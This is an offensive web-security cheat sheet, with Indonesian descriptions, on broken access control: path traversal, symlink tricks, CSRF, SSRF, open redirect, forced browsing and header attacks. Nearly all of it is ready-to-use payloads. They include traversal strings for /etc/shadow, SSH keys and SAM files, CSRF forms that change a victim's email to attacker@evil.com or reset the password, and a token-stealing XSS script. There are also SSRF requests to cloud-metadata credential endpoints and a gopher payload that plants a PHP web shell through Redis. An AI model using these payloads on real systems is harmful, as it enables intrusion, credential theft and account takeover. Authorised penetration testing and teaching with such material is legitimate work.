# 🔓 BROKEN ACCESS CONTROL CHEATSHEET — Part 06A

## OWASP A01:2021 — Path Traversal, CSRF, SSRF, Open Redirect

> ⚠️ **Hanya untuk penetration testing yang sudah diotorisasi & tujuan pendidikan.**

---

## 📑 Table of Contents (06A)
1. [CWE-22: Path Traversal](#cwe-22-path-traversal)
2. [CWE-23: Relative Path Traversal](#cwe-23-relative-path-traversal)
3. [CWE-36: Absolute Path Traversal](#cwe-36-absolute-path-traversal)
4. [CWE-59: Link Following](#cwe-59-link-following)
5. [CWE-61: Symlink Following](#cwe-61-symlink-following)
6. [CWE-65: Windows Hard Link](#cwe-65-windows-hard-link)
7. [CWE-352: CSRF](#cwe-352-csrf)
8. [CWE-918: SSRF](#cwe-918-ssrf)
9. [CWE-601: Open Redirect](#cwe-601-open-redirect)
10. [CWE-425: Forced Browsing](#cwe-425-forced-browsing)
11. [CWE-441: Confused Deputy](#cwe-441-confused-deputy)

---

# CWE-22: Path Traversal

**Deskripsi**: Penyerang memanipulasi file paths untuk mengakses files/directories di luar intended directory.

## Detection

```bash
# Nuclei
nuclei -u https://target.com -tags lfi,path-traversal

# dotdotpwn
dotdotpwn -m http -h target.com -p 80 -f /etc/passwd

# ffuf
ffuf -u "https://target.com/download?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0

# Manual (Burp Intruder + LFI wordlists)
```

## Payloads — Linux

```
# ===== BASIC =====
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd

# ===== ENCODING VARIANTS =====
# URL encode
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd          # Double URL encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Unicode / UTF-8 overlong
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.php

# ===== BYPASS FILTERS =====
# Double dot bypass
....//....//....//etc/passwd
..../..../..../etc/passwd
....\/....\/....\/etc/passwd

# Path normalization
/var/www/../../etc/passwd
./../../etc/passwd

# Dengan backslash (Windows-style on Linux)
..\..\..\etc\passwd
..\..\..\..\etc\passwd

# Mixed slashes
..\/..\/..\/etc/passwd
../.\../.\../etc/passwd

# ===== INTERESTING FILES (Linux) =====
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/crontab
/etc/ssh/sshd_config
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/proc/net/tcp
/proc/sched_debug
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/root/.bash_history
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/home/user/.bash_history
```

## Payloads — Windows

```
# ===== BASIC =====
..\..\..\windows\win.ini
..\..\..\..\windows\system32\config\sam
..\..\..\windows\system32\drivers\etc\hosts

# ===== ENCODING =====
..%5c..%5c..%5cwindows%5cwin.ini
..%255c..%255c..%255cwindows%255cwin.ini

# ===== INTERESTING FILES (Windows) =====
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\debug\NetSetup.log
C:\Windows\repair\SAM
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\Users\Administrator\.ssh\id_rsa
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\php\php.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
```

## Payloads — Application-Specific

```
# ===== JAVA / SPRING =====
WEB-INF/web.xml
WEB-INF/classes/application.properties
WEB-INF/classes/application.yml
META-INF/MANIFEST.MF

# ===== NODE.JS =====
../../../package.json
../../../.env
../../../node_modules/.package-lock.json

# ===== PHP =====
../../../wp-config.php
../../../configuration.php
../../../config.php
../.env

# ===== DOCKER =====
/proc/1/cgroup                    # Detect Docker
/run/secrets/                     # Docker secrets
/.dockerenv                       # Docker marker
```

## Tools

```bash
# dotdotpwn (comprehensive path traversal fuzzer)
dotdotpwn -m http -h target.com -p 80 -f /etc/passwd -k "root:"
dotdotpwn -m http-url -u "https://target.com/download?file=TRAVERSAL" -k "root:"

# kadimus (LFI scanner)
kadimus -u "https://target.com/page?file=test" -B

# fimap
fimap -u "https://target.com/page?file=test"

# Burp Suite: Intruder with LFI wordlist from SecLists
```

---

# CWE-23: Relative Path Traversal

**Deskripsi**: Subset CWE-22 menggunakan relative paths (../). Lihat payloads di CWE-22.

```
# Key difference: uses ../ sequences
../secret.txt
../../config/database.yml
../../../etc/passwd

# Bypass for path joining functions
# app.get('/files/' + userInput)
../app.js
../routes/admin.js
../.env
```

---

# CWE-36: Absolute Path Traversal

**Deskripsi**: Penyerang langsung menyebutkan absolute path tanpa relative traversal.

```
# Direct absolute path
/etc/passwd
/etc/shadow
C:\Windows\win.ini

# Di parameter
?file=/etc/passwd
?path=/var/log/auth.log
?document=C:\inetpub\wwwroot\web.config

# URL encoded
?file=%2fetc%2fpasswd
?file=%2Fetc%2Fpasswd
```

---

# CWE-59/61/65: Link Following & Symlinks

**Deskripsi**: Exploitasi symbolic links dan hard links untuk mengakses restricted files.

## CWE-59 & CWE-61: Symlink Following

```bash
# ===== LINUX SYMLINK ATTACKS =====
# Create symlink pointing to sensitive file
ln -s /etc/passwd /tmp/upload/innocent.txt
# If app reads /tmp/upload/innocent.txt → gets /etc/passwd

# Race condition symlink attack
# (TOCTOU: Time-of-check to time-of-use)
while true; do
  ln -sf /etc/shadow /tmp/target_file
  ln -sf /tmp/safe_file /tmp/target_file
done

# Tar symlink attack (upload malicious tar)
ln -s /etc/passwd link_to_passwd
tar czf evil.tar.gz link_to_passwd
# Upload evil.tar.gz → server extracts → follows symlink

# Zip symlink attack
ln -s /etc/passwd symlink_passwd
zip --symlinks evil.zip symlink_passwd
# Upload ZIP → extract → read /etc/passwd

# ===== DETECTION =====
# Check for symlinks in upload directory
find /var/www/uploads -type l -ls

# Git symlink
# .git/objects/ symlinked to /etc/
```

## CWE-65: Windows Hard Link

```powershell
# Windows hard link attacks
mklink /H hardlink.txt C:\sensitive\file.txt
mklink /J junction_dir C:\restricted\directory

# NTFS Alternate Data Streams
type evil.exe > innocent.txt:hidden.exe
start innocent.txt:hidden.exe

# Detection
dir /AL   # List links
fsutil hardlink list C:\path\to\file
```

---

# CWE-352: Cross-Site Request Forgery (CSRF)

**Deskripsi**: Penyerang memaksa user yang terautentikasi untuk mengirim request yang tidak diinginkan.

## Detection

```bash
# ZAP
# Passive scan otomatis detect missing CSRF tokens

# Nuclei
nuclei -u https://target.com -tags csrf

# Manual checklist:
# 1. Ada CSRF token di form? (hidden input / header)
# 2. Token di-validasi server-side?
# 3. Token unique per session?
# 4. SameSite cookie attribute?
# 5. Referer/Origin header checked?
```

## Payloads

```html
<!-- ===== GET-BASED CSRF ===== -->
<!-- Image tag (auto-fire) -->
<img src="https://target.com/api/delete-account?confirm=true" style="display:none">

<!-- Iframe -->
<iframe src="https://target.com/api/transfer?to=attacker&amount=10000" style="display:none"></iframe>

<!-- ===== POST-BASED CSRF ===== -->
<!-- Auto-submit form -->
<html>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="https://target.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="true">
  </form>
</body>
</html>

<!-- ===== JSON BODY CSRF ===== -->
<html>
<body>
<script>
  fetch('https://target.com/api/change-password', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: 'hacked123'})
  });
</script>
</body>
</html>

<!-- ===== CSRF TOKEN BYPASS ===== -->
<!-- 1. Remove token entirely -->
<!-- 2. Empty token value -->
<!-- 3. Use another user's token -->
<!-- 4. Change POST to GET -->
<!-- 5. Change Content-Type -->

<!-- Content-Type bypass -->
<form action="https://target.com/api" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","dummy":"' value='"}' type="hidden">
  <input type="submit">
</form>

<!-- ===== CSRF + XSS COMBO ===== -->
<!-- If XSS exists, extract CSRF token: -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/settings', true);
  xhr.onload = function() {
    var token = this.responseText.match(/csrf_token" value="([^"]+)"/)[1];
    // Use token for CSRF attack
    var form = new FormData();
    form.append('csrf_token', token);
    form.append('email', 'attacker@evil.com');
    fetch('/api/change-email', {method:'POST', body:form, credentials:'include'});
  };
  xhr.send();
</script>

<!-- ===== CSRF via ClickJacking ===== -->
<style>
  iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
  button { position: absolute; top: 300px; left: 200px; z-index: -1; }
</style>
<iframe src="https://target.com/settings"></iframe>
<button>Click me for a prize!</button>
```

## Tools

```bash
# XSRFProbe (CSRF scanner)
pip install xsrfprobe
xsrfprobe -u https://target.com/form-page

# Burp Suite: Generate CSRF PoC
# Right-click request → Engagement tools → Generate CSRF PoC
```

---

# CWE-918: Server-Side Request Forgery (SSRF)

**Deskripsi**: Penyerang memaksa server untuk melakukan HTTP requests ke internal resources.

## Detection

```bash
# Nuclei
nuclei -u https://target.com -tags ssrf

# SSRFmap
python ssrfmap.py -r request.txt -p url -m readfiles,portscan,aws

# gf patterns
cat urls.txt | gf ssrf > ssrf_targets.txt
```

## Payloads

```
# ===== BASIC INTERNAL =====
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://127.0.1
http://2130706433          # Decimal 127.0.0.1
http://0x7f000001          # Hex 127.0.0.1
http://0177.0.0.1          # Octal
http://0x7f.0x0.0x0.0x1    # Hex dotted

# ===== CLOUD METADATA =====
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (needs token — harder to SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/

# ===== INTERNAL PORT SCAN =====
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:9200
http://127.0.0.1:27017

# ===== PROTOCOLS =====
file:///etc/passwd
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_INFO%0d%0a
ftp://127.0.0.1:21

# ===== GOPHER PAYLOADS =====
# Redis RCE via gopher
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

# ===== BYPASS FILTERS =====
# DNS rebinding
attacker.com → resolves to 127.0.0.1
http://localtest.me          # Resolves to 127.0.0.1
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net

# URL parsing confusion
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1%2523@attacker.com

# Redirect bypass
http://attacker.com/redirect?url=http://127.0.0.1

# Short URL
http://tinyurl.com/XXXXX  → 127.0.0.1

# IPv6 mapped IPv4
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

## Tools

```bash
# Gopherus (generate gopher payloads)
python gopherus.py --exploit redis
python gopherus.py --exploit mysql
python gopherus.py --exploit fastcgi
python gopherus.py --exploit smtp

# SSRFmap
python ssrfmap.py -r req.txt -p url -m portscan
python ssrfmap.py -r req.txt -p url -m readfiles
python ssrfmap.py -r req.txt -p url -m aws
```

---

# CWE-601: Open Redirect

**Deskripsi**: Aplikasi redirect user ke URL yang dikontrol penyerang, digunakan untuk phishing.

## Detection

```bash
# Nuclei
nuclei -u https://target.com -tags redirect

# gf pattern
cat urls.txt | gf redirect > redirect_targets.txt

# OpenRedireX
python openredirex.py -l urls.txt -p payloads.txt
```

## Payloads

```
# ===== BASIC =====
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
?return=https://evil.com
?rurl=https://evil.com
?dest=https://evil.com
?destination=https://evil.com
?continue=https://evil.com
?go=https://evil.com
?forward=https://evil.com
?out=https://evil.com
?view=https://evil.com
?to=https://evil.com
?target=https://evil.com
?link=https://evil.com

# ===== BYPASS FILTERS =====
# Double URL encode
?url=https%3A%2F%2Fevil.com
?url=https%253A%252F%252Fevil.com

# @ symbol
?url=https://target.com@evil.com

# Backslash
?url=https://evil.com\@target.com
?url=//evil.com

# No protocol
?url=//evil.com
?url=\/\/evil.com
?url=/\evil.com

# Tab/newline
?url=//evil%09.com
?url=//evil%0a.com

# Subdomain trust
?url=https://target.com.evil.com
?url=https://evil-target.com

# Fragment
?url=https://target.com#@evil.com

# data URI
?url=data:text/html,<script>alert(1)</script>
?url=javascript:alert(1)

# Null byte
?url=https://evil.com%00.target.com

# Parameter pollution
?url=https://target.com&url=https://evil.com

# CRLF + Location header
?url=%0d%0aLocation:%20https://evil.com
```

---

# CWE-425: Forced Browsing (Direct Request)

**Deskripsi**: Mengakses resources yang seharusnya restricted dengan langsung mengakses URL-nya.

```bash
# ===== COMMON HIDDEN PATHS =====
# Admin panels
/admin
/admin/
/administrator
/manager
/dashboard
/cpanel
/wp-admin
/phpmyadmin

# Config files
/.env
/config.php
/wp-config.php
/web.config
/application.yml
/config/database.yml

# Backup files
/backup.sql
/database.sql.bak
/backup.zip
/site.tar.gz
/db_dump.sql

# Debug / Status
/debug
/trace
/status
/health
/info
/server-status
/server-info
/.git/config
/.svn/entries
/.DS_Store

# API docs
/swagger.json
/api-docs
/graphql
/graphiql
/api/swagger
/openapi.json

# ===== TOOLS =====
# ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# gobuster
gobuster dir -u https://target.com -w common.txt -x php,html,bak,old,zip

# dirsearch
dirsearch -u https://target.com -e php,html,js,bak
```

---

# CWE-441: Confused Deputy (Unintended Proxy)

**Deskripsi**: Aplikasi bertindak sebagai proxy tanpa disadari, memungkinkan akses ke internal resources.

```bash
# ===== HOST HEADER ATTACKS =====
# Password reset poisoning
POST /forgot-password HTTP/1.1
Host: evil.com
# → Reset link sent with evil.com domain

# Cache poisoning
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
# → Cached response contains evil.com references

# ===== HEADER INJECTION =====
X-Forwarded-For: 127.0.0.1       # Bypass IP restriction
X-Original-URL: /admin            # Bypass URL-based access control
X-Rewrite-URL: /admin             # Same
X-Custom-IP-Authorization: 127.0.0.1

# ===== HTTP REQUEST SMUGGLING =====
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
